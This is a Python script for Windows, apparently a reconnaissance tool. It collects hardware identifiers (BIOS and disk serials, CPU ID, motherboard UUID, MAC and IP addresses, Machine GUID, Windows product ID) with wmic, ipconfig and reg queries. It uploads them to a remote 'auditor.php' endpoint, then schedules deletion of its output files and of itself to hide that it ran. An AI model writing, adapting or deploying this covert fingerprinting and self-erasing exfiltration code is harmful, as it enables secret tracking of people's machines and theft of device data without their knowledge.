import subprocess
import csv
import requests
from datetime import datetime
from pathlib import Path
import os
import sys
import tempfile
import shutil

SERVER_URL = "http://localhost/main/RReconnaissance/rr_2/auditor.php"

def run(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return f"ERROR: {e}"

def collect():
    cmds = {
        "Serial Number": 'wmic bios get serialnumber /value',
        "CPU ID": 'wmic cpu get processorid /value',
        "Motherboard UUID": 'wmic csproduct get uuid /value',
        "MAC Address": 'ipconfig /all',
        "BIOS Version": 'wmic bios get smbiosbiosversion /value',
        "SSD Serial": 'wmic logicaldisk get serialnumber /value',
        "Machine GUID": 'reg query "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid',
        "Windows Product ID": 'wmic os get serialnumber /value',
        "IP Address": 'ipconfig'
    }

    data = {}
    for k, c in cmds.items():
        out = run(c)
        data[k] = out[:500] if out else "N/A"
    return data

def save_files(data):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Creates the files in the temporary directory instead of the current directory
    temp_dir = Path(tempfile.gettempdir()) / f"audit_{ts}"
    temp_dir.mkdir(exist_ok=True)

    txt_path = temp_dir / f"audit_{ts}.txt"
    csv_path = temp_dir / f"audit_{ts}.csv"

    with open(txt_path, "w", encoding="utf-8") as f:
        for k, v in data.items():
            clean = v.strip()
            f.write(f"{k}:\n{clean}\n\n")

    with open(csv_path, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["Field", "Value"])
        for k, v in data.items():
            w.writerow([k, v])

    return txt_path, csv_path, temp_dir

def upload(files):
    try:
        # Checks if the files exist before uploading
        if not os.path.exists(files[0]) or not os.path.exists(files[1]):
            raise Exception("One or both files do not exist")
            
        # Checks file size to ensure they are not empty
        if os.path.getsize(files[0]) == 0 or os.path.getsize(files[1]) == 0:
            raise Exception("One or both files are empty")
            
        with open(files[0], "rb") as f1, open(files[1], "rb") as f2:
            files_payload = [
                ("files[]", ("audit.txt", f1, "text/plain")),
                ("files[]", ("audit.csv", f2, "text/csv")),
            ]
            
            response = requests.post(
                SERVER_URL,
                files=files_payload,
                timeout=15
            )
            
            # Checks if upload was successful
            if response.status_code != 200:
                raise Exception(f"Upload failed: Status code {response.status_code}")
                
        return True
    except Exception as e:
        print(f"Error during upload: {e}")
        return False

def delete_self():
    # Gets the path of the current script/executable
    if getattr(sys, 'frozen', False):
        # If running as a PyInstaller executable
        current_script = sys.executable
    else:
        # If running as a normal Python script
        current_script = os.path.abspath(__file__)
    
    # Uses cmd to delete the file after the script finishes
    subprocess.Popen(
        f'cmd /c timeout /t 2 /nobreak >nul && del "{current_script}"',
        shell=True
    )

def cleanup_files(txt_path, csv_path, temp_dir):
    # Schedules deletion of audit files and directory after a short delay
    subprocess.Popen(
        f'cmd /c timeout /t 5 /nobreak >nul && del "{txt_path}" && del "{csv_path}" && rmdir "{temp_dir}"',
        shell=True
    )

def main():
    try:
        data = collect()
        txt_path, csv_path, temp_dir = save_files(data)
        
        # Attempts upload and checks if successful
        upload_success = upload((txt_path, csv_path))
        
        if upload_success:
            print("Upload completed successfully")
            # Schedules deletion of audit files and directory only if upload succeeded
            cleanup_files(txt_path, csv_path, temp_dir)
        else:
            print("Upload failed, files will not be deleted")
            
        # Schedules deletion of the script/executable after completion
        delete_self()
    except Exception as e:
        print(f"Error during execution: {e}")
        # Even in case of error, attempts to delete the script
        delete_self()

if __name__ == "__main__":
    main()
